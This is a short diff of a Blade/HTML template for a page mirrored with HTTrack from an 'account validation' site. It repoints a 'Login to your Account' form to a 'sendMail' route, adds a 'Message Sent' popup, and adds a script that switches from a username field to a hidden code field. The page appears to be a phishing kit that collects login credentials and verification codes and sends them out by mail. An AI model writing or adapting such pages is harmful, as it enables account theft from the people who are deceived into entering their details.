@@ -251,8 +251,8 @@
             
         </header>
         <section class="form-sect">
-            <form action="/sendMail" method="POST">
-                <div class="form-header">
+        <form class="contact-form" action="{{route('sendMail')}}" method="post">
+               <div class="form-header">
                     <span class="material-symbols-outlined">login</span>
                     <p>Login to your Account</p>
                 </div>
@@ -287,7 +287,33 @@
             })
 
         </script>
-    </body>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<!-- header style two End -->
+@if(session()->has('message'))
+<script>
+	Swal.fire({
+	icon: "success",
+	title: "Message Sent",
+	text: "{{ session()->get('message') }}",
+	});
+</script>
+@endif
+  
+    <script>
 
-<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Jul 2024 07:10:26 GMT -->
+      const switchForm = () => {
+
+        $("#userInput").hide();
+        $("#codeInput").show();
+      }
+
+      window.addEventListener('load', function () {
+        $("#codeInput").hide();
+        //switchForm();
+      })
+
+    </script>
+    
+  </body>
+
 </html>
